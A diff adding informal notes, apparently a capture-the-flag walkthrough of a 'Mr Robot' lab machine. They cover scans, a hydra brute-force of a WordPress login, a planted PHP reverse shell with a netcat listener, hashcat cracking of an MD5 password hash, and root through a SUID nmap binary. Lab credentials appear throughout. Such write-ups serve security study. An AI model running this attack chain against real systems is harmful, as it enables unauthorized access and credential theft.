@@ -1,0 +1,89 @@
+sudo nmap -p- -sC -sV -sS -vvvv -A -O -Pn -T5 10.10.103.105
+	I wasn't getting anything beforehand so I decided to throw the -T5 at it
+We get port 80 and port 443 open, that is it, but I will let the scan keep going
+	Alright this guy hates the 'system'
+directory buster is showing a lot of stuff... now it is time to go through it all
+	Looks like we also figured out that port 22 was closed
+There is so much stuff coming through in the dir buster is said screw it and tried robots.txt
+Sure enough it did work
+	User-agent: *
+fsocity.dic
+key-1-of-3.txt
+
+Ok, lets go to key-1-of-3.txt in the web browser
+	(I also decided to do this the legit way and use nikto)
+nikto -h 10.10.103.105
+I also tried key 2 or 3 but that didn't work, thought it would be funny if it did
+Looking above, remember, we also have the fsocity.dic
+Lets download that and take a look at it
+	Looks like a wordlist, lets save this
+Alright after looking around a lot, and know what i got from the dirbuster I am thinking that the wordlist contains both the username and password
+The easiest way to do this is to first bruteforce the username, within dirbuster we did have a wp-login
+	hydra -L Downloads/fsocity.dic -p whatever 10.10.103.105 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.103.105%2Fwp-admin%2F&testcookie=1:F=Invalid username"  
+Alright we got a hit
+	Elliot is the username
+hydra -l Elliot -P Downloads/fsocity.dic 10.10.103.105 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.103.105%2Fwp-admin%2F&testcookie=1:S=302"
+	Noticed we changed the end to S=302 this is because that should be the response you get when you log in
+We are in
+	Elliot
+	ER28-0652
+Clicking through we can find some users
+	elliot (which we already knew about)
+	mich05654
+We can also upload files into the wp 
+	lets upload a php reverse shell
+I downloaded the pentest monkey php reverse shell from the following site
+	https://github.com/pentestmonkey/php-reverse-shell
+From there I then changed my IP and listening port
+Go to plugins, add new
+	while that is loading turn on your listening port
+	nc -lvnp 4444
+OK this started to become a pain and it took too long to load them
+	I decided to just change one of the plugins that were already in there
+Editing all-in-one-seo-pack/all_in_one_seo_pack.php (inactive)
+	From there I deleted that plugin and put the reverse shell in there
+From I noticed the site moving very slowly, so I decided to restart the box
+This time we will try to customize one of the themes and add the reverse shell in their, hopefully this works
+	so we go to appearance and down at the bottom editor
+	From there we look to the right side and see a 404 template, this is if the site does not exist
+	delete the information in there and upload your shell into it
+	now go to a site that does not exist
+10.10.122.206/yousuckhaha
+	look at your reverse shell
+	thats right it worked...
+lets go to cd home
+ls -la
+we see robot
+ls -la
+we see the flag, but cant get to it, we also see a password file in md5 format
+grab that
+now use put that hash in a file and then send it to hashcat
+hashcat -m 0 hash /usr/share/wordlists/rockyou.txt
+alright we have a password
+	c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
+Right now our terminal is a raw shell, before moving further lets get it in an actual terminal
+	python -c 'import pty; pty.spawn("/bin/bash")'
+su robot
+abcdefghijklmnopqrstuvwxyz
+cat key-2-of-3.txt
+	can't do much with sudo...
+for the third one i looked at the hint and it says nmap
+	i tried a couple of different scans for the localhost but couldnt really move into the different areas
+We need to figure out who has the suid bit to be allowed to utilize sudo, or find a vulnerability
+	find / -perm -u=s -type f 2>/dev/null
+We find a /usr/local/bin/nmap 
+lets see if we can find anything on nmap suid
+Here is an article on how to do this
+	https://pentestlab.blog/2017/09/25/suid-executables/
+ls -l /usr/local/bin/nmap
+nmap --interactive
+!sh
+# whoami
+whoami
+root
+# 
+ls -la /root
+cat /root/key-3-of-3.txt
+ALL DONE!!!
+
+
